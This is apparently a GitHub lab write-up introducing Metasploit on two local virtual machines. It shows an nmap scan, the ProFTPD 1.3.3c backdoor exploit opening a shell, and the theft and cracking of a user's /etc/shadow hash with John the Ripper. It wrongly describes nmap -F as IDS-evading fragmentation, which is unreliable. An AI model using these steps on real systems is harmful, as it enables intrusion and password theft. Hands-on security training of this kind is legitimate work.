# Metasploit-Framework-Introduction
We need to Virtual Machines for this experiment.

## Attacking Machine:
![image](https://github.com/user-attachments/assets/d2481ddc-ef86-4426-af92-c3b2ab785c88)

Network Settings:

![image](https://github.com/user-attachments/assets/ce21e70b-cecf-4ebb-a281-ade56810001e)

IP Address:

![image](https://github.com/user-attachments/assets/beaaa940-19ee-4959-8083-6ba19fd6adec)

192.168.56.102

## Target Machine:

![image](https://github.com/user-attachments/assets/4f7617b3-bd6a-416a-82a3-a34393addcf9)

Network Settings:

![image](https://github.com/user-attachments/assets/5ff4c676-08ae-41bd-b449-0e44cd329f7e)

IP Address:

![image](https://github.com/user-attachments/assets/b29b9698-e14c-4c87-9dc8-bd6007922fc0)

192.168.56.101

## Reconnaissance:

We recon the target device (the Ubuntu machine), we at least collect its IP Address and Username.

Some rudimental methods of recon can be found in the article linked [here](https://dataoverhaulers.com/reconnaissance-in-ethical-hacking/)

## Scanning (using nmap):

At the attacking/Kali VM, scan the target/Ubuntu VM by ‘nmap -F -sV {the IP address of the Target VM}’ to get the list of services and their versions (attack surface).

```
nmap -F -sV {the IP address of the Target VM}
```

-F (Fragmentation): This option fragments the packets being sent during the scan. It breaks the IP packets into smaller pieces to avoid detection by intrusion detection systems (IDS) or firewalls, as fragmented packets are more difficult for such systems to analyze.

-sV (Service Version Detection): This option attempts to determine the version of the services running on the open ports. Nmap sends probes to services and analyzes the responses to identify specific software versions and additional information like service banners.

![image](https://github.com/user-attachments/assets/61e4fb21-29ee-4e27-9c46-a9ca6f708df1)

## MSF Console:

Bring up ‘msfconsole’ from the attacking/Kali VM.

![image](https://github.com/user-attachments/assets/df138b8e-d67b-4e5b-8026-d7b0d4d01bfc)

Inside msfconsole:

'search’ the arms in the arsenal against the service the target machine provided. The arms are service version sensitive, that was the reason we needed to use the -sV option in the nmap scan.

Since after performing the nmap scan we found that ProFTPD was on of the services that is open, we use the msf command:

```
search ProFTPB
```

![image](https://github.com/user-attachments/assets/c01581fc-5456-400e-8eab-c10afd2f99f9)

Then we find some potential vulnerabilities that we could exploit in our target system.

![image](https://github.com/user-attachments/assets/b04453c4-91b8-4f7e-bd2e-50cd6878509f)

We use the following command to start using one of the listed backdoor vulnerabilities:

```
use exploit/unix/ftp/proftpd_133c_backdoor
```

Then we ask msfconsole to show the options:

```
show options
```

Setting the target host we are attacking:

```
set RHOST 192.168.56.101
```

![image](https://github.com/user-attachments/assets/45f5c034-a893-431a-9e0a-cb5ac50e4939)

We type the following command and press TAB button twice or a few times, which lists all the available payloads. Then we try to exploit each one to see which one gets us the access to the terminal of the target system.

```
set payload {press TAB twice or a bit more}
```

```
exploit {the payloads path from the list}
```

When we are in the terminal we can begin our command and control part of the attack.

![image](https://github.com/user-attachments/assets/656f6841-29bf-456a-bcac-678c78ebf9c0)

# Cracking Password for the Ubuntu machine with username: marlinspike

![image](https://github.com/user-attachments/assets/5b3a21c8-3de3-4f55-ba70-57b939032944)

We use the command below to open the /etc/shadow file and extract the line corresponding to the user marlinspike:

```
sudo cat /etc/shadow | grep marlinspike
```

![image](https://github.com/user-attachments/assets/dc047963-b001-49b0-b860-13b4b6b17cde)

We save the output to a text file.

```
sudo cat /etc/shadow | grep marlinspike > shadowMarlinspike.txt
```

![image](https://github.com/user-attachments/assets/c79f7197-fb3d-47f5-9a0a-7302454fc386)

Then we use the command john (John-the-Reaper) to crack the password.

```
john shadowMarlinspike.txt
```

We can login with that password in the target machine:

![image](https://github.com/user-attachments/assets/0d4227b4-0c99-4f39-9e53-015273c06ee5)

![image](https://github.com/user-attachments/assets/04ec9ed9-3910-4e70-8d46-057770871a11)
